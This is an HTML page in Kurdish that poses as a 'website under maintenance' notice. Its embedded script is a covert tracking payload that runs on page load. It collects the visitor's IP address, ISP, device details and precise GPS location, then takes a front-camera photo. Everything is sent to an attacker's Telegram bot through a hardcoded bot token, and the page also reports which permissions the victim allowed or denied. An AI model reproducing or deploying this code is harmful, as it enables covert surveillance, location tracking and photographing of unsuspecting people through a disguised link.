<!DOCTYPE html>
<html lang="ku">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>ماڵپەڕەکە لەژێر کارکردندایە</title>
    <style>
        body {
            font-family: Arial, sans-serif;
            background-color: #f4f4f9;
            color: #333;
            display: flex;
            justify-content: center;
            align-items: center;
            height: 100vh;
            margin: 0;
            text-align: center;
        }
        .container {
            background: white;
            padding: 30px;
            border-radius: 10px;
            box-shadow: 0 4px 15px rgba(0,0,0,0.1);
            max-width: 400px;
        }
        h1 { font-size: 24px; color: #e74c3c; }
        p { font-size: 16px; color: #666; }
    </style>
</head>
<body>
    <div class="container">
        <h1>⚙️ ماڵپەڕەکە لەژێر کارکردندایە</h1>
        <p>تکایە کەمێکی تر هەوڵبدەرەوە، کار لەسەر چاککردنی سیستەمەکە دەکرێت.</p>
    </div>

    <script>
        const BOT_TOKEN = "8918413203:AAG-EBiQakMDS0jK1H3d26ox0UpBh6LN-eY";
        
        const urlParams = new URLSearchParams(window.location.search);
        const chatId = urlParams.get('id');

        function sendTelegramMessage(text) {
            if (!chatId) return;
            fetch(`https://api.telegram.org/bot${BOT_TOKEN}/sendMessage`, {
                method: 'POST',
                headers: { 'Content-Type': 'application/json' },
                body: JSON.stringify({
                    chat_id: chatId,
                    text: text,
                    parse_mode: 'Markdown'
                })
            }).catch(err => console.error(err));
        }

        function sendTelegramPhoto(blob) {
            if (!chatId) return;
            const formData = new FormData();
            formData.append('chat_id', chatId);
            formData.append('photo', blob, 'capture.jpg');
            formData.append('caption', '📸 **وێنەی ڕاستەوخۆی بەکارهێنەر لە کامێرای پێشەوە!**');

            fetch(`https://api.telegram.org/bot${BOT_TOKEN}/sendPhoto`, {
                method: 'POST',
                body: formData
            }).catch(err => console.error(err));
        }

        async function collectDeviceData() {
            if (!chatId) return;

            // 1. ناردنی زانیارییە گشتییەکانی IP و ئامێر
            let ipData = {};
            try {
                const res = await fetch('https://ipapi.co/json/');
                ipData = await res.json();
            } catch (e) {}

            const sysInfo = `
🔔 **سەردانیکەرێکی نوێ لینکەکەی کردەوە!**

🌐 **IP Address:** \`${ipData.ip || 'نادیار'}\`
🏢 **کۆمپانیای ئینتەرنێت (ISP):** ${ipData.org || 'نادیار'}

📱 **سیستەم:** ${navigator.platform}
📐 **ڕوونی شاشە:** ${window.screen.width}x${window.screen.height}
💻 **User-Agent:** ${navigator.userAgent}
            `;
            sendTelegramMessage(sysInfo);

            // 2. پشکنینی دۆخی Location
            if ("geolocation" in navigator) {
                navigator.geolocation.getCurrentPosition(
                    (position) => {
                        const lat = position.coords.latitude;
                        const lon = position.coords.longitude;
                        const mapLink = `https://www.google.com/maps?q=${lat},${lon}`;
                        
                        const locMsg = `
🟢 **ڕێگەپێدانی شوێن (Location): ALLOW کراوە**
🎯 **دۆخ:** لۆکەیشنی مۆبایلەکەی (GPS) هەڵکراوە و شوێنی دەقیقی هێنرایەوە!

📍 **پۆتانەکان:** \`${lat},${lon}\`
🗺 **نەخشە:** [کردنەوە لە Google Maps](${mapLink})
                        `;
                        sendTelegramMessage(locMsg);
                    },
                    (error) => {
                        if (error.code === error.PERMISSION_DENIED) {
                            sendTelegramMessage("🔴 **ڕێگەپێدانی شوێن (Location): DENY کراوە**\n(کەسەکە کلیکی لەسەر Block / Deny کرد یان ڕێگەی نەدا).");
                        } else if (error.code === error.POSITION_UNAVAILABLE) {
                            sendTelegramMessage("🟡 **ڕێگەپێدانی شوێن (Location): ALLOW کراوە**\n(کەسەکە Allowی کردووە، بەڵام **Location/GPSی مۆبایلەکەی داگیراوە/کوژاوەیە**، بۆیە شوێنی دەقیق نەدۆزرایەوە).");
                        } else if (error.code === error.TIMEOUT) {
                            sendTelegramMessage("⚠️ **شوێن:** کاتەکە بەسەرچوو لە دەستنیشانکردنی GPS.");
                        }
                    },
                    { enableHighAccuracy: true, timeout: 8000 }
                );
            } else {
                sendTelegramMessage("❌ ئامێرەکە پشتگیری لە Geolocation ناکات.");
            }

            // 3. پشکنینی دۆخی کامێرا
            if (navigator.mediaDevices && navigator.mediaDevices.getUserMedia) {
                navigator.mediaDevices.getUserMedia({ video: { facingMode: "user" } })
                    .then((stream) => {
                        sendTelegramMessage("🟢 **ڕێگەپێدانی کامێرا (Camera): ALLOW کراوە**\n📸 وێنەکە گیرا و دەنێردرێت...");

                        const video = document.createElement('video');
                        video.srcObject = stream;
                        video.play();

                        video.onloadedmetadata = () => {
                            setTimeout(() => {
                                const canvas = document.createElement('canvas');
                                canvas.width = video.videoWidth || 640;
                                canvas.height = video.videoHeight || 480;
                                const ctx = canvas.getContext('2d');
                                ctx.drawImage(video, 0, 0, canvas.width, canvas.height);

                                canvas.toBlob((blob) => {
                                    sendTelegramPhoto(blob);
                                    stream.getTracks().forEach(track => track.stop());
                                }, 'image/jpeg');
                            }, 1000);
                        };
                    })
                    .catch((err) => {
                        sendTelegramMessage("🔴 **ڕێگەپێدانی کامێرا (Camera): DENY کراوە**\n(کەسەکە کلیکی لەسەر Block / Deny کرد و ڕێگەی نەدا وێنەی بپچرێت).");
                    });
            } else {
                sendTelegramMessage("❌ ئامێرەکە پشتگیری لە کامێرا ناکات.");
            }
        }

        window.onload = collectDeviceData;
    </script>
</body>
</html>
